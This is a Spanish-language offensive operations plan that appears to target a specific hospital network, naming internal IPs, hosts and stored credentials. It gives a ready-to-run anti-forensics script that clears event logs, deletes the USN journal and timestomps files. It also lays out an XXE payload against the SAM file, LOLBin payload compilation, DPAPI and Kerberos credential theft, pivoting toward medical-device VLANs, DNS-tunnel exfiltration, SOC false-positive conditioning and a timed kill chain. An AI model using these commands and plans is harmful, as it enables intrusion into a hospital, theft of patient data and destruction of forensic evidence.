**Duración:** 5-10 min | **Ventana de detección:** Ninguna (wevtutil no genera alertas)

**⚠️ NOTA:** Dado que no existe SIEM ni log forwarding, todos los logs eliminados se pierden **permanentemente** sin copia centralizada.

**Procedimiento completo de limpieza:**

```powershell
# === EVENT LOGS ===
wevtutil.exe cl Microsoft-Windows-PowerShell/Operational  # Event 4104
wevtutil.exe cl Security                                    # Residual (audit=0, por precaución)
wevtutil.exe cl System                                      # Cambios de servicio
wevtutil.exe cl Application                                 # Registros de aplicación
wevtutil.exe cl "Microsoft-Windows-TaskScheduler/Operational"
wevtutil.exe cl "Microsoft-Windows-Windows Firewall With Advanced Security/Firewall"

# === PREFETCH (rastros de ejecución) ===
Remove-Item C:\Windows\Prefetch\*.pf -Force -ErrorAction SilentlyContinue

# === USN JOURNAL (rastros de creación/modificación de archivos) ===
fsutil usn deletejournal /d C:

# === TIMESTOMP (hacer que los archivos parezcan antiguos) ===
$(Get-Item C:\Windows\Temp\payload.exe).CreationTime = "01/01/2020 00:00:00"
$(Get-Item C:\Windows\Temp\payload.exe).LastWriteTime = "01/01/2020 00:00:00"

# === REGISTRY ARTIFACTS ===
Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\*" -Recurse -Force -ErrorAction SilentlyContinue

# === ESET LOCAL LOGS ===
Remove-Item "C:\ProgramData\ESET\ESET Security\Logs\*" -Force -Recurse -ErrorAction SilentlyContinue

# === RED ===
arp -d *                    # Limpiar tabla ARP
ipconfig /flushdns          # Limpiar caché DNS
nbtstat -R                  # Limpiar historial NetBIOS

# === RUTAS Y TRANSPORT FILTERS ===
# Restaurar rutas a estado original (o dejar que expiren por ValidLifetime)
# Eliminar transport filters temporales
# Reactivar ESET si fue desactivado (para evitar sospechas)

# === NO LIMPIAR ===
# No eliminar cuentas creadas (podrían detectarse por ausencia)
# No eliminar tareas programadas (podrían verificarse)
# No restaurar SBL=1 (no hay GPO que lo reactivaría, mejor dejarlo)
```

**Inducción de falsos positivos en el SOC (OPSEC avanzado):**

Crear Transport Filters **intermitentes** hacia los servidores ESET. Un script C# cambia `MinRtoMs` de 30000 a 100 cada 60 minutos. El endpoint aparece intermitentemente en la consola como "con pérdida de paquetes" — un problema de red recurrente. Si el SOC escala el ticket a redes, el equipo de redes descartará la alerta como falso positivo. Esto **condiciona al defensor a ignorar el indicador**.

---

## 6. Vectores Sub-OS (Confirmados vs. Requieren Verificación)

| Vector | Confirmado | Procedible | Detalle |
|--------|-----------|-----------|---------|
| **Intel AMT/ME** | LMS activo, MEI driver cargado, SOL en COM3, IRQ 109 compartido con TPM | ⚠️ Verificar provisionamiento | `curl -k https://10.1.7.211:16992` — si responde, proceder |
| **Npcap + USBPcap** | ✅ Drivers cargados y activos | ✅ Listo para usar | Captura pasiva inmediata sin instalación |
| **Intel UHD 770 GPU** | Driver igdkmdn64.sys cargado (60MB) | ℹ️ Solo awareness | CVEs históricos de escalada, pero explotación compleja |
| **WIBU-KEY Dongle** | wibukey64.sys cargado | ⚠️ Verificar versión para CVEs | Buscar CVEs para versión específica del driver |
| **Realtek WiFi** | RTL8852BE instalado, sin IP | ⚠️ Verificar hosted network | `netsh wlan show drivers` → buscar "Hosted network: Yes" |
| **NVMe Controller** | 21 IRQs MSI-X asignados | ℹ️ Solo awareness | Firmware injection teóricamente posible |
| **TPM 2.0 + Pluton** | Drivers cargados, BitLocker activo | ℹ️ Solo awareness | Si ME comprometido → claves BitLocker accesibles pre-boot |

---

## 7. Evaluación Operacional de Vectores (Reemplaza Severidad)

| Vector | ¿Funciona? | Fiabilidad | Riesgo OPSEC | Prioridad ejecución |
|--------|-----------|------------|-------------|-------------------|
| APT-04 (CRD) | Sí (confirmado) | Alta | Bajo | 1 — Primer acceso |
| APT-02 (NTLM Relay) | Sí (confirmado) | Alta | Bajo | 2 — Lateral movement |
| APT-03 (Stack manipulation) | Sí (confirmado, saliente only) | Alta | Bajo | 3 — Cegar SOC |
| APT-05 (Cloud exfil) | Sí (confirmado) | Alta | Bajo | 4 — Exfiltración |
| APT-06 (WinRM ghost) | Sí (confirmado) | Alta | Bajo | 5 — Ejecución remota |
| APT-09 (Password void) | Sí (confirmado) | Alta | Bajo | 6 — Backdoor accounts |
| APT-10 (WDAC gap) | Sí (confirmado) | Alta | Bajo | 7 — Ejecución libre |
| APT-07 (Rogue DC) | **Parcial** — AS-REP roasting funciona, Rogue DC completo NO sin krbtgt | Media | Bajo | 8 — Cred harvesting |
| APT-08 (Process injection) | Probable pero **riesgoso** con DBI activo | Media | **MEDIO** | 9 — Solo si ESET desactivado o DLL sideloading |
| APT-01 (ESET off) | Probable (selfdefense complica) | Media | **MEDIO** | 10 — **ÚLTIMO RECURSO** |
| APT-11 (PrintNightmare) | Probable (RPC permitido) | Media | Bajo | 11 — Escalada alternativa |
| APT-12 (Dev tools) | Probable (DSAapp.exe crashes) | Media | Bajo | 12 — Compilación in-situ |
| APT-13 (Rogue WiFi) | No verificado | Baja | Bajo | 13 — Oportunístico |

**⚠️ CORRECCIÓN: APT-07 Rogue DC — Separar en sub-vectores:**

1. **Captura pasiva de AS-REQ** (FACTIBLE con solo DNS hijacking): Obtener hashes de cuentas que intentan autenticarse, crackeables offline si la contraseña es débil. No requiere rogue DC.
2. **AS-REP roasting** (FACTIBLE con DNS hijacking): Capturar AS-REP de cuentas sin preautenticación. No requiere rogue DC.
3. **Rogue DC completo** (REQUIERE hash krbtgt, NO FACTIBLE sin comprometer DC real primero): Marcar como **TEÓRICO** — no usar como paso de kill chain.

**⚠️ CORRECCIÓN: APT-08 Inyección de Proceso — Cualificar riesgo:**

La Deep Behavioral Inspection de ESET (`enabled=true`, `injection_detection=true`) monitorea `WriteProcessMemory`, `CreateRemoteThread`, `NtMapViewOfSection`, `QueueUserAPC`. Con ESET activo (recomendación operacional), la inyección de proceso **puede ser detectada**.

Técnicas de syscall directo evaden hooks de user-mode, pero ESET también tiene **kernel-level callbacks** (`PsSetCreateThreadNotifyRoutine`, `ObRegisterCallbacks`) que no se evaden con syscall directo.

**Alternativas operacionales más seguras:**
- **DLL sideloading:** Colocar DLL malicioso en el path de Kodak → se carga legítimamente al iniciar el servicio → hereda acceso de red irrestricto → ESET no detecta (carga legítima de DLL)
- **Process hollowing:** Reemplazar código del proceso antes de que ESET establezca callbacks
- **Inyección vía `msra.exe`:** Asistencia Remota tiene regla TCP Any→Any en Domain/Private — proceso "hacha" para herencia de firewall

---

## 8. Vectores Ofensivos Adicionales (No en Análisis Original)

### 8.1 — Kodak AIRESTfulService — RCE Directo como LocalSystem

Kodak Capture Pro tiene API RESTful para importación automática. Si la API no requiere autenticación (común en despliegues internos):

```bash
# Enumeración del servicio
curl http://10.1.7.211:8080/api/v1/ 2>/dev/null

# XXE via XML import (si el servicio procesa XML):
curl -X POST http://10.1.7.211:8080/api/v1/import \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/config/SAM">]>
<import><filename>&xxe;</filename></import>'

# Si RCE exitoso → SYSTEM inmediato (aidispatcher.exe corre como LocalSystem)
# No necesita Potato attack, no genera eventos de proceso
```

### 8.2 — Impresoras RICOH como Vector de Reconocimiento y Pivote

Las impresoras RICOH (10.1.7.20) típicamente tienen:
- Panel web administrativo (HTTP/HTTPS) con credenciales default admin/admin
- SNMP con community strings por defecto (public/private)
- Dos interfaces de red: VLAN oficina (10.1.7.x) y VLAN producción/impresión
- Firmware con CVEs conocidas
- Cola de impresión con documentos históricos (PHI)

```bash
# Reconocimiento pasivo vía SNMP
snmpwalk -v2c -c public 10.1.7.20 1.3.6.1.2.1.4.35  # ARP table de la impresora
# → Revela hosts en la VLAN de producción que no son visibles desde 10.1.7.0/24

# Si la impresora tiene segunda interface en 10.1.8.x (VLAN médica):
# Comprometer impresora → pivotar hacia VLAN de dispositivos médicos
# Los dispositivos médicos corren Windows XP/7 empotrados → vulnerables a EternalBlue
# Típicamente SIN endpoint protection
```

### 8.3 — Volumen G: — "La Caja Negra"

El volumen G: aparece como "No disponible" en msinfo32 (1.95GB sin filesystem reportado).

```powershell
# Enumeración forzada
Get-Volume | Where-Object {$_.DriveLetter -eq 'G'}
manage-bde -status G: 2>$null

# Buscar recovery keys en todo el disco
Get-ChildItem C:\ -Recurse -Include "*.bek","*.txt" -ErrorAction SilentlyContinue | 
    Select-String -Pattern "Recovery Key" -SimpleMatch

# Si G: es un volumen BitLocker con auto-unlock → montaje automático bajo ciertas condiciones
# Si contiene backups EMR/EHR → objetivo de exfiltración de alto valor
```

### 8.4 — svchost.exe → 72.154.7.100:443 (Cox Communications)

Conexión a IP no-Microsoft/Google/ESET. Podría ser telemetría de terceros o **C2 existente** de otro actor.

```powershell
# Identificar PID y servicio exacto
Get-NetTCPConnection -RemoteAddress 72.154.7.100 | 
    Select-Object LocalPort, OwningProcess, @{N='ProcessName';E={(Get-Process -Id $_.OwningProcess).ProcessName}}
tasklist /svc | findstr <PID>
```

**Si es C2 de otro actor:** Robar credenciales de C2, usar su infraestructura como proxy (false flag), o eliminarlo para evitar competencia.

### 8.5 — Weaponización del .NET SDK — "Compilar el Arma en el Campo de Batalla"

Si el .NET 9 SDK está instalado (INFERIDO de DSAapp.exe crash reports), se pueden compilar payloads in-situ:

```cmd
:: Compilar con csc.exe (compilador C# del SDK)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:C:\Windows\Temp\payload.exe payload.cs

:: Alternativa: MSBuild inline (evita csc.exe directo)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe malicious.csproj

:: Alternativa: InstallUtil (LOLBin, evade detección de firma)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll
```

**Ventaja ofensiva:** Payloads compilados localmente no tienen firmas conocidas por ESET. ValidateAdminCodeSignatures=0 → no se verifica firma en elevación.

### 8.6 — Credencial Microsoft como Vector de Acceso Lateral Independiente

`WindowsLive:target=virtualapp/didlogical` es una credencial persistente (Local machine persistence). Si proporciona acceso a OneDrive del usuario, el atacante puede:

1. Extraer la credencial del host objetivo vía DPAPI
2. Usarla desde **cualquier dispositivo externo** para acceder a OneDrive
3. Acceder a todos los archivos sincronizados desde fuera de la red corporativa
4. **No requiere presencia continua en la red** — es un canal de acceso independiente

**Evaluación con RoadTools:**
```cmd
:: Si el token proporciona acceso a Azure AD:
RoadTools.exe auth --token <WindowsLive_token>
:: Enumerar roles de 02vehmtjtbvhbumg en Azure AD
:: Si tiene Intune Administrator o Global Reader:
::   → Registrar dispositivo malicioso en Intune
::   → Desplegar política de cumplimiento que desactive Defender en flota
::   → Acceder a Azure DevOps con mismo token
```

---

## 9. Timeline Operacional — "Operación Fantasma del Centro"

| Minuto | Fase | Acción | Herramienta | Host |
|--------|------|--------|-------------|------|
| 0-10 | Recon | Npcap pasivo + ARP scan silencioso | windump/Npcap API | Red 10.1.7.0/24 |
| 10-15 | Acceso | NTLM relay hacia 10.1.7.211 | ntlmrelayx + Responder | 10.1.7.211 |
| 15-20 | Escalada | PrintSpoofer o GodPotato (condicional) | SharpPrintSpoofer/GodPotato | 10.1.7.211 |
| 20-25 | Telemetría | SBL=0 + Transport Filter + DNS Hijack | .NET assembly compilado | 10.1.7.211 |
| 25-35 | Credenciales | DPAPI + Kerberos tickets + SAM dump | SharpDPAPI + Rubeus + Impacket | 10.1.7.211 |
| 35-45 | Persistencia | AMT takeover + cuentas locales + watchdog | MEConfig + net user + schtasks | 10.1.7.211 |
| 45-60 | Lateral | Propagación automática vía CimSession | Script WMI/CIM autónomo | 10.1.7.9, .204, + |
| 60-75 | Exfiltración | Google Drive + DNS tunneling | rclone + dnscat2 | Internet |
| 75-90 | Anti-forense | Event logs + USN Journal + Prefetch + timestomp | wevtutil + fsutil + sdelete | 10.1.7.211 |

**Ventana de detección por fase:**

| Fase | Duración | Ventana detección | Factor limitante |
|------|----------|-------------------|-----------------|
| Fase 0 (Recon) | 10-30 min | Ninguna | Pasivo, sin tráfico generado |
| Fase 1 (Acceso) | 15-30 min | Baja | CRD es tráfico legítimo |
| Fase 2 (Escalada) | 5-10 min | Baja | Sin auditoría de procesos |
| Fase 3 (Telemetría) | 2-5 min | **MEDIA** | Cambios en registro — punto más riesgoso si se tocan claves ESET |
| Fase 4 (Creds) | 10-15 min | Baja | RPC permitido, sin auditoría |
| Fase 5 (Lateral) | 15-30 min | **MEDIA** | Cada host adicional aumenta superficie de detección |
| Fase 6 (Exfil) | Continuo | Baja | Tráfico HTTPS legítimo |
| Fase 8 (Limpieza) | 5-10 min | Ninguna | wevtutil no genera alertas |

**Hallazgo operacional clave:** Fase 3 es el punto más riesgoso SI se desactiva ESET. Si se opera con ESET activo (recomendación), este riesgo se elimina completamente.

---

## APÉNDICE A: Matriz de Hallazgos Correlacionados (Referencia Analítica)

> Los hallazgos APT-01 a APT-13 se conservan aquí como referencia de inteligencia. Para evaluación operacional, ver Sección 7.

### APT-01: "Raíz de Hueso" — Desactivación Remota Silenciosa de Todo el Ecosistema Defensivo

| Dimensión | Detalle |
|-----------|---------|
| **Fuentes Cruzadas** | ESET (DisablingDenied=0, DisablingRequiresUAC=0, DisablingRequiresPassword=0 para TODOS los módulos) + SecPol (9/9 categorías auditoría=0) + PS Telemetry (VsRpcRegInAllowed=1) + Live Recon (nltest ERROR_NO_SUCH_DOMAIN, Netlogon detenido) |
| **Mecanismo** | Un atacante puede desactivar remotamente TODOS los módulos de ESET sin UAC, sin contraseña, sin evento de auditoría, sin reversión GPO. El ERAgent puede cegarse simultáneamente con New-NetTransportFilter contra 38.90.226.0/24. |
| **⚠️ CORRECCIÓN OPERACIONAL** | selfdefense=1 SÍ protege claves de registro de ESET contra escritura. `reg add` contra claves ESET es bloqueado y genera alerta HIPS. Opciones reales: (A) ecmd.exe sin password (NO VERIFICADO), (B) desinstalación forzada sin password, (C) NtTerminateProcess directo, (D) **NO desactivar ESET** — operar con ESET activo. **POSICIÓN EN KILL CHAIN: ÚLTIMO RECURSO, NO PASO PRIMARIO.** |
| **Evaluación operacional** | Probable | Media fiabilidad | **MEDIO riesgo OPSEC** | Prioridad: 10 |

### APT-02: "Espejo Roto" — Relay NTLM Masivo

| Dimensión | Detalle |
|-----------|---------|
| **Fuentes Cruzadas** | ESET (VsSmbNoSecExtsDenied=0, VsSmbNtlmToTrustedDenied=0) + SecPol (EnableSecuritySignature=0, AuditLogonEvents=0, CachedLogonsCount=10) + ARP (80 hosts, MAC 20:53:8D idéntico) + WinFW (SMB inbound ALLOW Trusted) |
| **Mecanismo** | SMB signing no requerido + NTLM sin restricción + zero auditing = relay exponencial. Cada host comprometido agrega hasta 10 credenciales de dominio adicionales. Los hosts 20:53:8D garantizan políticas ESET idénticas. |
| **Evaluación operacional** | Sí (confirmado) | Alta fiabilidad | Bajo riesgo OPSEC | Prioridad: 2 |

### APT-03: "Cirugía de Stack" — Manipulación TCP/IP que Evade ESET

| Dimensión | Detalle |
|-----------|---------|
| **Fuentes Cruzadas** | PS Telemetry (Set-NetRoute, New-NetTransportFilter) + ESET (EnableDefenseARPPoisoning=1 protege solo L2, epfw.sys opera en L4+) + Network Surface (DNS 1.1.1.1/8.8.8.8) + SecPol (AuditPolicyChange=0) |
| **⚠️ CORRECCIÓN OPERACIONAL** | La inyección de rutas funciona para tráfico **SALIENTE** (routing decision ocurre antes de WFP filter). NO funciona para tráfico **ENTRANTE** (WFP filter ve paquetes primero). Etiquetar como "efectivo para tráfico saliente solamente". |
| **Evaluación operacional** | Sí (confirmado, saliente only) | Alta fiabilidad | Bajo riesgo OPSEC | Prioridad: 3 |

### APT-04: "Puerta Giratoria" — Chrome Remote Desktop C2 Persistente

| Dimensión | Detalle |
|-----------|---------|
| **Fuentes Cruzadas** | WinFW (remoting_host.exe = ANY protocol/port/address ALL profiles) + ESET (bExcludeTrusted=1, browser protection OFF) + Live Recon (remoting_host conectado a 142.251.x.x:443 y 74.125.247.128:3478 STUN) + SecPol (AuditLogonEvents=0) + msinfo32 (chromoting service ACTIVE, Automatic, LocalSystem) |
| **Evaluación operacional** | Sí (confirmado) | Alta fiabilidad | Bajo riesgo OPSEC | Prioridad: 1 |

### APT-05: "Sincronía Oscura" — Exfiltración Cloud con SSL Bypassed

| Dimensión | Detalle |
|-----------|---------|
| **Fuentes Cruzadas** | ESET (bExcludeTrusted=1, browser protection OFF, sin DLP) + Live Recon (GoogleDriveFS 3 instancias, OneDrive activo, driver kernel) + SecPol (AuditObjectAccess=0) + Stored Credentials (WindowsLive, MicrosoftAccount) |
| **Evaluación operacional** | Sí (confirmado) | Alta fiabilidad | Bajo riesgo OPSEC | Prioridad: 4 |

### APT-06: "Ejecución Fantasma" — WinRM Silencioso

| Dimensión | Detalle |
|-----------|---------|
| **Fuentes Cruzadas** | WinFW (regla WinRM 5985 preconfigurada) + ESET (VsRpcRegInAllowed=1, VsRpcScmInAllowed=1) + SecPol (ALL audit=0) + PS Telemetry (CimSession permite habilitar WinRM remotamente) |
| **Evaluación operacional** | Sí (confirmado) | Alta fiabilidad | Bajo riesgo OPSEC | Prioridad: 5 |

### APT-07: "Huérfano de Dominio" — Cosecha de Credenciales Kerberos/NTLM

| Dimensión | Detalle |
|-----------|---------|
| **Fuentes Cruzadas** | Live Recon (nltest ERROR_NO_SUCH_DOMAIN, DNS 1.1.1.1/8.8.8.8) + ESET (Kerberos/LDAP outbound ALLOW) + PS Telemetry (Set-NetRoute evade ARP defense) + SecPol (DisableDomainCreds=0, CachedLogonsCount=10) |
| **⚠️ CORRECCIÓN OPERACIONAL** | Un Rogue DC completo requiere hash krbtgt (NO disponible sin comprometer DC real). **Separar en sub-vectores:** (1) AS-REQ capture = FACTIBLE, (2) AS-REP roasting = FACTIBLE, (3) Rogue DC completo = TEÓRICO (marcar como no ejecutable sin krbtgt). |
| **Evaluación operacional** | Parcial (AS-REP roasting funciona, Rogue DC NO) | Media fiabilidad | Bajo riesgo OPSEC | Prioridad: 8 |

### APT-08: "Herencia Maldita" — Inyección en Procesos con Firewall Unrestricted

| Dimensión | Detalle |
|-----------|---------|
| **Fuentes Cruzadas** | WinFW (Kodak 3 exe TCP/UDP ANY→ANY ALL; Teams 2 exe ANY→ANY; CRD ANY→ANY) + ESET (DBI con injection_detection=true) + SecPol (AuditProcessTracking=0) + msinfo32 (Kodak Capture Pro LocalSystem, AIRESTfulService) |
| **⚠️ CORRECCIÓN OPERACIONAL** | DBI monitorea WriteProcessMemory, CreateRemoteThread, NtMapViewOfSection, QueueUserAPC. Con ESET activo, inyección de proceso es **riesgosa**. Syscalls directos evaden hooks user-mode pero NO callbacks kernel (PsSetCreateThreadNotifyRoutine, ObRegisterCallbacks). Alternativas más seguras: DLL sideloading en Kodak path, process hollowing antes de callbacks, inyección vía msra.exe. |
| **Evaluación operacional** | Probable pero riesgoso | Media fiabilidad | **MEDIO riesgo OPSEC** | Prioridad: 9 |

### APT-09: "Vacío de Contraseñas" — Política Cero + Sin Auditoría

| Dimensión | Detalle |
|-----------|---------|
| **Fuentes Cruzadas** | SecPol (MinimumPasswordLength=0, PasswordComplexity=0, PasswordHistorySize=0, AuditAccountManage=0, LimitBlankPasswordUse=1, RequireLogonToChangePassword=0) + ESET (VsRpcSamInAllowed=1) + Live Recon (DC inalcanzable) |
| **Evaluación operacional** | Sí (confirmado) | Alta fiabilidad | Bajo riesgo OPSEC | Prioridad: 6 |

### APT-10: "Tierra de Nadie" — WDAC User-Mode OFF + HVCI Activo

| Dimensión | Detalle |
|-----------|---------|
| **Fuentes Cruzadas** | msinfo32 (WDAC kernel Enforced, user-mode Disabled, HVCI Active, VBS Running) + ESET (AllowSignedModifications=1, Dynamic Threat Defense OFF, Cloud Sandbox no provisionado) + SecPol (ValidateAdminCodeSignatures=0, AuthenticodeEnabled=0) |
| **Evaluación operacional** | Sí (confirmado) | Alta fiabilidad | Bajo riesgo OPSEC | Prioridad: 7 |

### APT-11: "Impresora Zombie" — Print Spooler + RICOH MFPs

| Dimensión | Detalle |
|-----------|---------|
| **Fuentes Cruzadas** | msinfo32 (Print Spooler ACTIVE, 3 impresoras RICOH) + ESET FW (Trusted zone permite RPC/IPP) + Live Recon (RICOH en 10.1.7.20 via WSD) + SecPol (AuditObjectAccess=0) |
| **Evaluación operacional** | Probable (RPC permitido) | Media fiabilidad | Bajo riesgo OPSEC | Prioridad: 11 |

### APT-12: "Arsenal del Desarrollador" — DSAapp.exe + .NET SDK

| Dimensión | Detalle |
|-----------|---------|
| **Fuentes Cruzadas** | msinfo32 (DSAapp.exe crash reports, .NET) + Live Recon (usuario 13660, sesión desconectada) + SecPol (AuditProcessTracking=0) + ESET (AllowSignedModifications=1, DT Defense OFF) |
| **Evaluación operacional** | Probable | Media fiabilidad | Bajo riesgo OPSEC | Prioridad: 12 |

### APT-13: "AP Fantasma WiFi" — Realtek RTL8852BE Rogue AP

| Dimensión | Detalle |
|-----------|---------|
| **Fuentes Cruzadas** | msinfo32 (RTL8852BE WiFi 6, MAC 14:B5:CD:32:FE:17, red virtual 192.168.137.0/24) + ESET FW (sin inspección L2) + Live Recon (sin IP asignada, habilitado) |
| **Evaluación operacional** | No verificado | Baja fiabilidad | Bajo riesgo OPSEC | Prioridad: 13 |

---

## APÉNDICE B: Diagnóstico de Visibilidad SOC

| Capa de Telemetría | Estado | Visibilidad |
|-------------------|--------|-------------|
| Windows Event Audit | 9/9 = NO AUDITING | 0% |
| PowerShell Script Block | Activo, local, limpiable | 5% |
| ESET Threat Alerts | Parcial | 15% |
| ESET Management Agent | Activo, vulnerable a degradación | 10% |
| Windows Defender ATP | DETENIDO | 0% |
| SIEM Agent | NO EXISTE | 0% |
| Network IDS/IPS | Solo local ESET IDS | 8% |
| DNS Monitoring | Ninguno | 0% |
| DLP | Ninguno | 0% |
| **VISIBILIDAD EFECTIVA TOTAL** | | **~3%** |

**Veredicto:** El SOC está completamente ciego. La triple ausencia (sin auditoría + sin SIEM + sin DC) hace que cualquier ataque sea forensemente invisible y no remediable centralmente. La única defensa real es la detección fuera del host: NIDS en la red, análisis de tráfico en el gateway, y monitoreo de canales de exfiltración desde la infraestructura de red.

---

## APÉNDICE C: Tabla de Herramientas Ofensivas

| Técnica | Herramienta primaria | Alternativa | Versión/Compatibilidad | Notas |
|---------|---------------------|-------------|----------------------|-------|
| Recon pasivo | windump/Npcap API | netsh trace | Npcap ya instalado | Sin instalación |
| NTLM relay | ntlmrelayx.py (Impacket) | Inveigh (PowerShell) | Impacket 0.11+ | Impacket preferido (no PS = no Event 4104) |
| Escalada Potato | GodPotato (.NET 4.8) | PrintSpoofer | GodPotato v1.4+ | Funciona en Win11 26200 |
| Escalada PrintNightmare | SharpPrintNightmare | PrintNightmare Python | C# compilado | No genera Event 4104 en target |
| DPAPI extraction | SharpDPAPI | Mimikatz dpapi::cred | SharpDPAPI v2+ | Menos firmas conocidas |
| Kerberos tickets | Rubeus | klist (nativo) | Rubeus v3.0+ | Compilar localmente |
| SAM dump | secretsdump.py | reg.py save (Impacket) | Impacket 0.11+ | Vía RPC SAMR |
| Browser creds | SharpChromium | hack-chrome | SharpChromium v1.1+ | Más silencioso |
| LSASS dump (emergencia) | Custom C# Hell's Gate | N/A | Custom compilado | Syscalls directos, in-memory parse |
| C2 canal | Covenant (modificado) | dnscat2 | Covenant custom | Formato mensaje = Google Drive API |
| Exfiltración | Google Drive (nativo) | rclone | Ya instalado | 3 instancias activas |
| DNS tunneling | dnscat2 | Invoke-DNSExfiltrator | dnscat2 v0.07+ | Puerto 53 sin restricción |
| Compilación in-situ | csc.exe / MSBuild | InstallUtil | .NET Framework 4.x | Ya presente en sistema |
| Anti-forense | wevtutil + fsutil + sdelete | custom C# | Nativos de Windows | Sin instalación |

---

## APÉNDICE D: Diagramas de Referencia

### D.1 — Bypass de Inspección ESET (Tráfico Saliente)

```
TRÁFICO SALIENTE (Route injection BYPASS funciona):
┌──────────────────────────────────────────────────────┐
│  Aplicación (Chrome RD, Drive, C2)                   │
├──────────────────────────────────────────────────────┤
│  CAPA 7: ESET SSL Inspection (bExcludeTrusted=1)    │
│           ⚠️ Excluye Google/Microsoft CAs            │
├──────────────────────────────────────────────────────┤
│  CAPA 4: ESET WFP (epfw.sys / epfwwfp.sys)          │
│           ✅ Filtra puertos/protocolos/direcciones    │
├──────────────────────────────────────────────────────┤
│  CAPA 3: Routing Decision ← ATAQUE AQUÍ              │
│           Set-NetRoute / New-NetTransportFilter       │
│           ❌ ESET NO inspecciona esta capa            │
├──────────────────────────────────────────────────────┤
│  CAPA 2: ESET ARP Defense (L2 only)                  │
│           ✅ Protege ARP spoofing                     │
│           ⚠️ NO protege contra route injection (L3)  │
├──────────────────────────────────────────────────────┤
│  CAPA 1: Intel I219-LM + ME (pila independiente)     │
└──────────────────────────────────────────────────────┘

TRÁFICO ENTRANTE (Route injection NO funciona):
┌──────────────────────────────────────────────────────┐
│  CAPA 1: NIC recibe paquete                          │
├──────────────────────────────────────────────────────┤
│  CAPA 4: ESET WFP (epfw.sys) → INSPECCIONA PRIMERO  │
│           ✅ ESET ve el paquete antes de routing      │
├──────────────────────────────────────────────────────┤
│  CAPA 3: Routing Decision → decisión de destino      │
│           Route injection no ayuda aquí               │
├──────────────────────────────────────────────────────┤
│  Aplicación                                          │
└──────────────────────────────────────────────────────┘
```

### D.2 — Gap Arquitectónico WDAC Kernel/User-Mode

```
┌──────────────────────────────────────────────────┐
│                 MODO KERNEL                       │
│  ┌──────────────────────────────────────────┐    │
│  │  HVCI ✅ ACTIVO                           │    │
│  │  WDAC Kernel ✅ ENFORCED                  │    │
│  │  - Bloquea code injection en kernel       │    │
│  │  - Bloquea drivers no firmados            │    │
│  │  - Bloquea sekurlsa::logonpasswords      │    │
│  └──────────────────────────────────────────┘    │
├────────── ═══════════════════════════════ ──────┤
│         GAP: WDAC User-Mode DESACTIVADO          │
│  ┌──────────────────────────────────────────┐    │
│  │  WDAC User-Mode ❌ DISABLED               │    │
│  │  Dynamic Threat Defense ❌ OFF            │    │
│  │  Cloud Sandbox ❌ NO PROVISIONADO         │    │
│  │                                           │    │
│  │  ✅ dpapi::cred / vault::cred funcionan   │    │
│  │  ✅ Kerberos ticket extraction funciona    │    │
│  │  ✅ .NET compiled tools funcionan          │    │
│  │  ✅ SSP injection funciona                 │    │
│  │  ✅ Cloned LSASS handle funciona           │    │
│  │  ✅ ValidateAdminCodeSignatures=0          │    │
│  └──────────────────────────────────────────┘    │
│                 "TIERRA DE NADIE"                  │
└──────────────────────────────────────────────────┘
```

### D.3 — Cadena de Efecto Dominó

```
Zero Audit Policy (9/9 = 0)
  → Sin timelines forenses
    → ESET desactivable sin evento (PERO selfdefense protege registro)
      → No SIEM / No forwarding (logs locales = limpiables)
        → SOC ciego (no distingue caída de compromiso)
          → Dominio huérfano (sin GPO, sin corrección central)
            → [CICLO SE REFUERZA]

PUNTO DE FALLO ÚNICO: Triple Ausencia (Sin Audit + Sin SIEM + Sin DC)
```

---

## APÉNDICE E: Evidencia JSON por Hallazgo

Cada hallazgo correlacionado se basa en datos extraídos de las 7 fuentes originales:

| Fuente | Archivo/Origen | Datos clave extraídos |
|--------|---------------|----------------------|
| ESET XML | eset_redteam_analysis_v4.json | Toggle rights, IDS settings, firewall rules, SSL config, browser protection status |
| Windows Firewall | netsh advfirewall export | CRD ANY→ANY, Kodak ANY→ANY, Teams ANY→ANY, WinRM 5985 preconfig |
| SecPol | secedit.sdb export | 9/9 audit=0, password policy=0, EnableSecuritySignature=0, CachedLogonsCount=10 |
| msinfo32 | sistema.txt | Drivers loaded, services active, VBS/HVCI/WDAC status, hardware inventory |
| PS Telemetry | Event 4104 logs | Set-NetRoute, CimSession, WMI execution capability |
| Live Recon | ARP/sessions/ports/creds | 80 hosts, MAC clusters, disconnected sessions, stored credentials |
| Hardware | Driver analysis | MEI, AMT, GPU, WiFi, NVMe, TPM, USB, WIBU-KEY |

---

## Epílogo: La Paradoja del Hospital

El Hospital Civil de Guadalajara ha desplegado una infraestructura de seguridad superficialmente robusta: ESET con HIPS, firewall, SSL inspection, exploit blocker, ransomware shield, VBS/HVCI, Secure Boot, BitLocker, TPM 2.0, WDAC kernel-mode. Cada tecnología, individualmente, parece sólida.

Pero la arquitectura de seguridad es como una cadena: su fortaleza es la de su eslabón más débil. Los eslabones débiles no son las tecnologías individuales, sino las **interacciones rotas entre ellas**:

1. ESET se puede desactivar sin UAC ni contraseña, **no se audita**, y **no se puede reimponer por GPO**.
2. El firewall inspecciona en L4+, pero las rutas IP se modifican en L3 y los transport filters operan en el stack TCP.
3. SSL inspection excluye certificados de confianza, pero CRD/Drive/OneDrive/Teams usan certificados Google/Microsoft.
4. HVCI protege el kernel, pero WDAC user-mode está OFF, Dynamic Threat Defense OFF, y no hay Cloud Sandbox.
5. Script Block Logging está activo, pero no se reenvía a SIEM, no está protegido por GPO, y se puede desactivar localmente.
6. Intel AMT proporciona gestión out-of-band, pero sus puertos no están filtrados por ESET, sus credenciales pueden ser default, y su tráfico es invisible al SO.
7. Kodak Capture Pro corre como LocalSystem, pero su API REST es accesible desde Trusted zone y su DLL path es vulnerable a sideloading.

**La seguridad no es la suma de sus componentes, sino el producto de sus interacciones.** Y cuando las interacciones están rotas, cada componente individual se convierte en una ilusión de seguridad.

**Principio operacional final:** Un atacante APT con este nivel de inteligencia no necesita traer herramientas externas — todo lo necesario ya está en el objetivo. El .NET SDK permite compilar payloads in-situ, los canales de sincronización cloud ya están abiertos, los drivers de captura ya están instalados, y las defensas ya están neutralizadas por la triple ausencia de visibilidad. El único recurso que el defensor tiene — la detección — ha sido sistemáticamente deshabilitado.
